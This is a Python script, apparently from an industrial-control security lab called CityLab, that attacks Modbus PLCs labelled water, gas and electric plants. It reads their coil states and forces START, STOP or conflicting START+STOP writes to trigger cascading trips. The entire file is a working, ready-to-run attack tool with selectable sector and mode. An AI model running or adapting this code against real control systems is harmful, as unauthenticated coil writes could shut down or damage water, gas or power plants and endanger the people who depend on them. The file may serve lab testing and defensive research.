#!/usr/bin/env python3
"""attacker/attack_multisector.py — Phase 2 multi-sector attack vector.

Targets PLC devices across water (10.0.3.10), gas (10.0.3.12), and elec (10.0.3.13)
to trigger cascading trips across inter-dependent physical plants.
"""
from __future__ import annotations

import argparse
import logging
import sys
import time
from typing import Dict, Tuple
from pymodbus.client import ModbusTcpClient


logging.basicConfig(level=logging.INFO, format='[%(asctime)s][%(levelname)s] %(message)s')
LOGGER = logging.getLogger('attack_multisector')

TARGET_PLCS: Dict[str, str] = {
    'water': '10.0.3.10',
    'gas':   '10.0.3.12',
    'elec':  '10.0.3.13',
}


def read_plc_state(host: str, port: int = 502) -> Tuple[int, ...]:
    client = ModbusTcpClient(host, port=port, timeout=2.0)
    connected = client.connect()
    if not connected:
        raise ConnectionError(f"Cannot connect to Modbus server at {host}:{port}")
    try:
        rr = client.read_coils(0, 4)
        if not rr or rr.isError():
            raise RuntimeError(f"Read error from {host}")
        return tuple(int(b) for b in rr.bits[:4])
    finally:
        client.close()


def force_coil(host: str, addr: int, value: bool, port: int = 502) -> None:
    client = ModbusTcpClient(host, port=port, timeout=2.0)
    connected = client.connect()
    if not connected:
        raise ConnectionError(f"Cannot connect to Modbus server at {host}:{port}")
    try:
        rr = client.write_coil(addr, int(value))
        if not rr or rr.isError():
            raise RuntimeError(f"Write error on {host} coil {addr}")
    finally:
        client.close()


def execute_cascading_attack(target_sector: str, mode: str) -> None:
    if target_sector == 'all':
        targets = list(TARGET_PLCS.items())
    elif target_sector in TARGET_PLCS:
        targets = [(target_sector, TARGET_PLCS[target_sector])]
    else:
        LOGGER.error("Unknown sector target: %s", target_sector)
        sys.exit(1)

    LOGGER.info("Starting Phase 2 attack on sector(s): %s | mode: %s", target_sector, mode)

    for sector, ip in targets:
        try:
            initial = read_plc_state(ip)
            LOGGER.info("[%s @ %s] Initial state: coils=%s", sector, ip, initial)

            if mode == 'fault':
                LOGGER.info("[%s @ %s] Injecting simultaneous START+STOP (coils 0+1)...", sector, ip)
                force_coil(ip, 0, True)
                force_coil(ip, 1, True)
            elif mode == 'start':
                LOGGER.info("[%s @ %s] Forcing START (coil 0)...", sector, ip)
                force_coil(ip, 0, True)
                force_coil(ip, 1, False)
            elif mode == 'stop':
                LOGGER.info("[%s @ %s] Forcing STOP (coil 1)...", sector, ip)
                force_coil(ip, 0, False)
                force_coil(ip, 1, True)

            time.sleep(1.0)
            final = read_plc_state(ip)
            LOGGER.info("[%s @ %s] Post-attack state: coils=%s", sector, ip, final)
        except Exception as exc:
            LOGGER.error("[%s @ %s] Attack failed: %s", sector, ip, exc)


def main() -> int:
    parser = argparse.ArgumentParser(description="CityLab Phase 2 Multi-Sector Attack Utility")
    parser.add_argument("--sector", choices=['water', 'gas', 'elec', 'all'], default='all', help="Target plant sector")
    parser.add_argument("--mode", choices=['start', 'stop', 'fault'], default='fault', help="Attack payload mode")
    args = parser.parse_args()

    execute_cascading_attack(args.sector, args.mode)
    return 0


if __name__ == '__main__':
    sys.exit(main())
